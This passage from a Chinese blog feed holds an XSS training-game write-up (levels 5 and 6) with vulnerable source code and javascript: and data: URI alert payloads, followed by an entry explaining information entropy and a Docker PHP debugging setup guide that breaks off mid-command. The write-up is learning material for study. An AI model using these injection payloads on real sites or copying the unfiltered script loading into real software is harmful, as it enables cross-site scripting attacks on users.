name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    Welcome! Today we are announcing the much anticipated<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level5.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/level5/frame/signup?next=confirm<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Sign up<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>     for an exclusive Beta.  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>关键代码</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&#123;&#123; next &#125;&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Next >><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre><p>直接讲next参数填入html，href也是可以执行JavaScript代码的</p><p>payload：</p><pre class="language-none"><code class="language-none">next&#x3D;javascript:alert(1);</code></pre><p>然后点<code>Next&gt;&gt;</code>就行</p><img src="/article/xss/image-20210424163533941.png" class="" title="level5-1" loading="lazy"><img src="/article/xss/85F04A35-370A-4FD5-9526-C80E89A2546A.png" class="" title="level5-2" loading="lazy"><blockquote><p>超链接标签<code>&lt;a&gt;</code>,用户点击相应按钮时可以跳转到新的页面（执行某个JavaScript），用到了这样的代码结构：</p><p><code>&lt;a href=&#39;javascript:doSomething()&#39;&gt;...&lt;/a&gt;</code></p><p>执行权首先落在doSomething()函数，若存在返回值则将返回值返给超链接进行合成</p></blockquote><hr><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p><a href="https://xss-game.appspot.com/level6/frame#/static/gadget.js">https://xss-game.appspot.com/level6/frame#/static/gadget.js</a></p><p>源码·index.html</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">function</span> <span class="token function">setInnerText</span><span class="token punctuation">(</span><span class="token parameter">element<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>element<span class="token punctuation">.</span>innerText<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        element<span class="token punctuation">.</span>innerText <span class="token operator">=</span> value<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        element<span class="token punctuation">.</span>textContent <span class="token operator">=</span> value<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">function</span> <span class="token function">includeGadget</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">var</span> scriptEl <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// This will totally prevent us from loading evil URLs!</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^https?:\/\/</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">setInnerText</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>          <span class="token string">"Sorry, cannot load a URL containing \"http\"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>       <span class="token comment">// Load this awesome gadget</span>      scriptEl<span class="token punctuation">.</span>src <span class="token operator">=</span> url<span class="token punctuation">;</span>       <span class="token comment">// Show log messages</span>      scriptEl<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">setInnerText</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">"Loaded gadget from "</span> <span class="token operator">+</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      scriptEl<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">setInnerText</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">"Couldn't load gadget from "</span> <span class="token operator">+</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>       document<span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>scriptEl<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token comment">// Take the value after # and use it as the gadget filename.</span>    <span class="token keyword">function</span> <span class="token function">getGadgetName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">return</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">"/static/gadget.js"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token function">includeGadget</span><span class="token punctuation">(</span><span class="token function">getGadgetName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// Extra code so that we can communicate with the parent page</span>    window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"message"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>source <span class="token operator">==</span> parent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">includeGadget</span><span class="token punctuation">(</span><span class="token function">getGadgetName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level6<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level6.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>cube<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/level6_cube.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>log<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Loading gadget...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>level.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> context<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>path<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>gadget.js</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/* This is a completely awesome invisible gadget */</span></code></pre><p>关键代码</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> scriptEl <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// This will totally prevent us from loading evil URLs!</span><span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^https?:\/\/</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">setInnerText</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>               <span class="token string">"Sorry, cannot load a URL containing \"http\"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// Load this awesome gadget</span>scriptEl<span class="token punctuation">.</span>src <span class="token operator">=</span> url<span class="token punctuation">;</span></code></pre><p>直接加载外部脚本，如图所示</p><img src="/article/xss/image-20210424165312513.png" class="" title="level6-1" loading="lazy"><p>既然没有任何过滤，那就直接用data数据流加载即可</p><p>RFC2397对data数据流有过定义 <a href="https://tools.ietf.org/html/rfc2397">https://tools.ietf.org/html/rfc2397</a></p><p><code>data:[&lt;mediatype&gt;][;base64],&lt;data&gt;</code></p><p>payload:</p><pre class="language-none"><code class="language-none">data:text&#x2F;plain,alert(1);</code></pre><img src="/article/xss/image-20210424165650678.png" class="" title="level6-2" loading="lazy"><img src="/article/xss/image-20210424165707701.png" class="" title="level6-3" loading="lazy"><hr><p>学习了基本的Cross-site scripting (XSS)</p><p>跨站点脚本（XSS）是一个安全漏洞，可能会影响网站。 这个漏洞可能使攻击者可以将自己的恶意JavaScript代码添加到显示给用户的HTML页面上。 一旦被害者的浏览器访问，此代码便可以执行，改变网站的行为或外观，窃取私人数据或代表用户执行操作等等</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈笔记 </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>熵和信息的学习</title>
      <link href="article/entropy/"/>
      <url>article/entropy/</url>
      
        <content type="html"><![CDATA[<p>摸鱼的学习总结，搞作品赛必须的理论学习…</p><span id="more"></span><blockquote><p><strong>信息是从多个可能状态中确定实际状态的代价</strong></p></blockquote><p>有些平台的回答挺好的，建议看看参考链接</p><img src="/article/entropy/640" class="" title="Entropy" loading="lazy"><p><strong>例子：How much is the shirt?</strong></p><p><strong>衬衫的价格是9磅15便士，所以你选择B项，答案却是C项。</strong></p><h2 id="信息熵"><a href="#信息熵" class="headerlink" title="信息熵"></a>信息熵</h2><p>当一件事情(宏观态)有很多种可能的情况时，这件事情(宏观态)对某人(观察者)而言具体是哪种情况(微观态)的不确定性叫做熵.</p><p>即这(知情情况的不确定性)就是熵</p><img src="/article/entropy/image-20210412143856985.png" class="" title="熵" loading="lazy"><p>而能<strong>消除这种不确定性的事物</strong>就是信息</p><img src="/article/entropy/image-20210412144408346.png" class="" title="信息" loading="lazy"><h2 id="信息量"><a href="#信息量" class="headerlink" title="信息量"></a>信息量</h2><p>熵和信息的增减数量相等，获取信息的同时也会消除不确定性(熵)</p><blockquote><p><strong>消除</strong>熵 &#x3D;&#x3D; <strong>获取</strong>信息</p></blockquote><p>例如在举例中，ABCD四个选项对于不知道最终答案的人来说都是等概率(25%)的，熵在此时(等概率)最大。</p><p>而告诉你答案是C的时候，这时熵最小。</p><p>能够消除熵的信息有三种类型，本质都是能够<strong>正确</strong>的调整每个可能情况的概率。</p><p>如果告诉你<code>&quot;答案是ABCD中的一个&quot;</code>则获取了0bit的信息，这种定义下，没有假信息的说法。只有能消除某人对某事不确定性的事物才叫做信息，即<code>&quot;答案是ABCD中的一个&quot;</code>不是信息</p><img src="/article/entropy/image-20210412152143538.png" class="" title="ABCD" loading="lazy"><p>而告诉你<code>&quot;A是正确答案&quot;</code>也不是信息(正确答案为C)，因为它不是正确的。</p><img src="/article/entropy/image-20210412152302898.png" class="" title="A" loading="lazy"><h3 id="类型一：调整概率"><a href="#类型一：调整概率" class="headerlink" title="类型一：调整概率"></a>类型一：调整概率</h3><p>听完听力后，你获取了一个消息”衬衫的价格是9磅15便士”，从这个消息中张三得知<code>&quot;有一半可能是C选项&quot;</code>，这个信息将C选项的概率提高到了50%(提供了0.21bits)</p><img src="/article/entropy/image-20210412153329273.png" class="" title="halfC" loading="lazy"><h3 id="类型二：排除干扰"><a href="#类型二：排除干扰" class="headerlink" title="类型二：排除干扰"></a>类型二：排除干扰</h3><p>听完听力后，你获取了一个消息”衬衫的价格是9磅15便士”，从这个消息中李四得知<code>&quot;B选项是错的&quot;</code>，这个信息直接将B选项概率降低到0%(0.415bits)</p><img src="/article/entropy/image-20210412153709078.png" class="" title="exclueB" loading="lazy"><h3 id="类型三：确定情况"><a href="#类型三：确定情况" class="headerlink" title="类型三：确定情况"></a>类型三：确定情况</h3><p>听完听力后，你获取了一个消息”衬衫的价格是9磅15便士”，王五英语非常好，从这个消息中王五直接得知<code>&quot;C选项是正确的&quot;</code>，这个信息直接将C选项概率提高到100%(2bits)，直接确定了实际情况。</p><img src="/article/entropy/image-20210412180814429.png" class="" title="C" loading="lazy"><h2 id="信息的接收"><a href="#信息的接收" class="headerlink" title="信息的接收"></a>信息的接收</h2><h3 id="媒介无关"><a href="#媒介无关" class="headerlink" title="媒介无关"></a>媒介无关</h3><p><strong>同一个观察者对同一件事接受到的信息与传递信息的信号模式无关</strong></p><p>王五写纸条给赵六<code>&quot;答案是C&quot;</code>传递的信息是2bits，直接告诉赵六传递的信息也是2bits，打三个响指(与赵六约定好，赵六能够理解)，传递的信息也是2bits</p><h3 id="相对个体"><a href="#相对个体" class="headerlink" title="相对个体"></a>相对个体</h3><p><strong>接收到的信息是相对于观察者已经对该事情的实际了解程度而言的</strong></p><p>王五会这道题，王五对这道题的熵就为0bit，不管王五搞不告诉赵六正确答案是C，因为观察者王五已经拥有这件事的所有信息，即王五确定(知道)这道题的答案是C，不确定性从最初就不存在。</p><p>赵六不会这道题，所以赵六对这道题的熵为2bits，因为观察者赵六没有对于这件事的任何信息。</p><p>对于李四而言，王五告诉张三<code>&quot;答案是C&quot;</code>，提供给李四1.58bits信息，因为观察者李四知道B是错的，观察者拥有关于这件事情的部分信息。</p><p>赵六认为C是错的，再告诉赵六答案是C，熵不会减少，因为没有实际帮助赵六消除事情的不确定性，因为熵不会随着主观臆想而减少，信息也不随主观意识而改变。</p><h3 id="相对事件"><a href="#相对事件" class="headerlink" title="相对事件"></a>相对事件</h3><p><code>&quot;太阳东升西落&quot;</code>，这句话对知道的人提供0bit信息，对知道或东或西升起的人提供了1bit信息，对认为东南西北都可能升起的人提供了2bits信息</p><img src="/article/entropy/image-20210412204545002.png" class="" title="东南西北" loading="lazy"><h2 id="信息量的计算"><a href="#信息量的计算" class="headerlink" title="信息量的计算"></a>信息量的计算</h2><p>信息也是物理量，类似于<code>千克</code>，选种千克为单位物理量，则测量其他物体的质量就是以多少个单位质量，即多少千克来计算。</p><p>信息也是参照单位事件的不确定性，看看待测事件的不确定性相当于”多少个”参照事件的不确定性，其中”多少个”，便是信息量。</p><p>如果选择参照事件像是抛硬币这样50%两种等概率情况的事件时，测量的信息量的单位就称为比特(bit)。</p><p>测量质量是，可以用待测物体质量m除以参照物体质量B，因为待测物体质量m&#x3D;参照物体质量B 乘 参照物体个数n，所以知道总质量m 求 个数 n 时，利用除法计算即可。</p><p>可是测量信息时却不能用除法，因为抛三枚硬币产生的等可能结果并非 $3*2&#x3D;6种$，而是 $2^3&#x3D;8种$</p><p><code>[正正正,正正反,正反正,正反反,反正正,反正反,反反正,反反反]</code></p><p>不是线性关系，而是指数关系，所以当知道可能情况个数m，想求这些情况相当于多少个n参照事件产生的时，就用对数运算即可。</p><p>$$ m &#x3D; 2^n $$</p><p>$$ n &#x3D; log_2m $$</p><p>所以对答案ABCD里哪一选项的不确定性即为<br>$$ log_24 &#x3D; 2 bits $$<br>这种情况因为每个选项都是25%的等概率才可以，与抛硬币一样，出现正反的概率都是相等的50%</p><img src="/article/entropy/image-20210413213110288.png" class="" width="24" loading="lazy"><p>可张三知道有一半可能是C选项时，各个情况的概率就不一样了。这时要分别测量待测事件每种可能的信息量后乘它们各自发生的概率再相加即可。</p><img src="/article/entropy/image-20210413213513800.png" class="" title="log2" loading="lazy"><p>不过我们不知道概率为1&#x2F;6的情况的不确定性相当于抛多少个硬币所产生的不确定性，m未知就没法用这个公式</p><p>$$ log_2m_A $$</p><p>但1%会发生的情况相当于从100个等概率情况中确定实际情况，而概率的倒数&#x3D;等概率情况的个数</p><p>$$ p &#x3D; 1&#x2F;100 $$<br>$$ 100 &#x3D; 1&#x2F;p $$</p><p>用概率的倒数1&#x2F;p替换等概率情况个数m后就可以计算每种情况的信息量了</p><p>$$ m &#x3D; 1&#x2F;p $$</p><img src="/article/entropy/image-20210413214141284.png" class="" title="p1" loading="lazy"><p>再将每个情况的信息量乘对应发生的概率再相加，就能算出总信息量了</p><p>$$ P_A: 1&#x2F;6 log_2(6&#x2F;1) &#x3D; 0.43 bits $$</p><p>$$ P_b:1&#x2F;6 log_2(6&#x2F;1) &#x3D; 0.43 bits $$</p><p>$$ P_c:1&#x2F;2 log_2(2&#x2F;1) &#x3D; 0.5 bits $$</p><p>$$ P_d:1&#x2F;6 log_2(6&#x2F;1) &#x3D; 0.43 bits $$</p><p>张三得知<code>&quot;有一半可能是C选项&quot;</code>后的不确定性(熵)为 $1.79 bits$</p><p>$$ P_a+P_b+P_c+P_d &#x3D; 1.79 bits $$</p><p>告诉张三<code>&quot;有一半可能是C选项&quot;</code>后提供的信息为 $2-1.79&#x3D;0.21 bits$</p><h3 id="均匀分布"><a href="#均匀分布" class="headerlink" title="均匀分布"></a>均匀分布</h3><p>$$ log_2m $$</p><h3 id="一般分布"><a href="#一般分布" class="headerlink" title="一般分布"></a>一般分布</h3><p>$$ \sum p_i log_2 p_i^{-1} $$</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.zhihu.com/question/22178202">知乎:信息熵是什么？</a></p><p><a href="https://mp.weixin.qq.com/s/toPBIMFPKG0FNzkKu2owfw">微信公众号:超智能体 信息论</a></p><p><a href="https://kns.cnki.net/kcms/detail/detail.aspx?filename=WJFZ202010024&dbcode=CJFQ&dbname=CJFD2020&v=f5iFxWNeOELznrq%25mmd2BGTndyblA9BGrQdi6BASTgoipwWx5vvgdZDVsk9Y0pGb3T8Ra">马猛飞,石乐义,魏东平,徐兴华.基于信息熵的分布式Web服务移动目标防御方案[J].计算机技术与发展,2020,30(10):131-136.</a></p>]]></content>
      
      
      <categories>
          
          <category> 杂谈笔记 </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker-php+mysql配置debug环境</title>
      <link href="article/phpstormdebug/"/>
      <url>article/phpstormdebug/</url>
      
        <content type="html"><![CDATA[<p>记录下之前搭建过程</p><span id="more"></span><h2 id="前置要求："><a href="#前置要求：" class="headerlink" title="前置要求："></a>前置要求：</h2><ol><li>装好phpstorm</li><li>装好docker</li><li>下载docker-compose(可选)</li></ol><p>最后附一键docker-compose搭建方法，可附带mysql，感谢王神指导。</p><h2 id="手动搭建"><a href="#手动搭建" class="headerlink" title="手动搭建"></a>手动搭建</h2><h3 id="docker进行PHP多版本部署"><a href="#docker进行PHP多版本部署" class="headerlink" title="docker进行PHP多版本部署"></a>docker进行PHP多版本部署</h3><p><code>docker run -d -p 10001:80 -v /Users/gyy/dockerPHP/www/html:/var/www/html php:5.6-apache</code><br><code>docker run -d -p 10002:80 -v /Users/gyy/dockerPHP/www/html:/var/www/html php:7.4-apache</code><br><code>docker run -d -p 10003:80 -v /Users/gyy/dockerPHP/www/html:/var/www/html php:7.2-apache</code><br><code>docker run -d -p 10004:80 -v /Users/gyy/dockerPHP/www/html:/var/www/html php:7.3-apache</code><br><code>docker run -d -p 10005:80 -v /Users/gyy/dockerPHP/www/html:/var/www/html php:7.0-apache</code></p><p>随意，要啥版本起啥容器，可以去<a href="https://hub.docker.com/_/php">https://hub.docker.com/_/php</a> 看</p><p>参数解释：</p><pre class="language-none"><code class="language-none">-d ： 后台运行-v ： 目录映射，因为我们要把本地目录映射到容器目录本地目录:容器目录</code></pre><h3 id="安装xdebug模块"><a href="#安装xdebug模块" class="headerlink" title="安装xdebug模块"></a>安装xdebug模块</h3><p>安装vim并换源</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'deb http://mirrors.aliyun.com/debian/ buster main non-free contrib \deb http://mirrors.aliyun.com/debian/ buster-updates main non-free contrib \ deb http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib \ deb-src http://mirrors.aliyun.com/debian/ buster main non-free contrib \ deb-src http://mirrors.aliyun.com/debian/ buster-updates main non-free contrib \ deb-src http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib \ deb http://mirrors.aliyun.com/debian-security/ buster/updates main non-free contrib \ deb-src http://mirrors.aliyun.com/debian-security/ buster/updates main non-free contrib'</span><span class="token operator">></span> /etc/apt/sources.list <span class="token punctuation">\</span><span class="token operator">&amp;&amp;</span> <span class="token function">apt</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token parameter variable">-y</span> <span class="token function">vim</span></code></pre><h4 id="更新一种换源方法，基本上各种系统均有效："><a href="#更新一种换源方法，基本上各种系统均有效：" class="headerlink" title="更新一种换源方法，基本上各种系统均有效："></a><strong>更新一种换源方法，基本上各种系统均有效</strong>：</h4><h5 id="amd"><a href="#amd" class="headerlink" title="amd:"></a>amd:</h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s/http:\/\/archive.ubuntu.com\/ubuntu\//http:\/\/mirrors.tuna.tsinghua.edu.cn\/ubuntu\//g'</span> /etc/apt/sources.list <span class="token operator">&amp;&amp;</span> <span class="token punctuation">\</span><span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s/http:\/\/security.ubuntu.com\/ubuntu\//http:\/\/mirrors.tuna.tsinghua.edu.cn\/ubuntu\//g'</span> /etc/apt/sources.list</code></pre><h5 id="arm-一般为用mac的小伙伴"><a href="#arm-一般为用mac的小伙伴" class="headerlink" title="arm(一般为用mac的小伙伴):"></a>arm(一般为用mac的小伙伴):</h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s/http:\/\/archive.ubuntu.com\/ubuntu\//http:\/\/mirrors.tuna.tsinghua.edu.cn\/ubuntu-ports\//g'</span> /etc/apt/sources.list <span class="token operator">&amp;&amp;</span> <span class="token punctuation">\</span><span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s/http:\/\/security.ubuntu.com\/ubuntu\//http:\/\/mirrors.tuna.tsinghua.edu.cn\/ubuntu-ports\//g'</span> 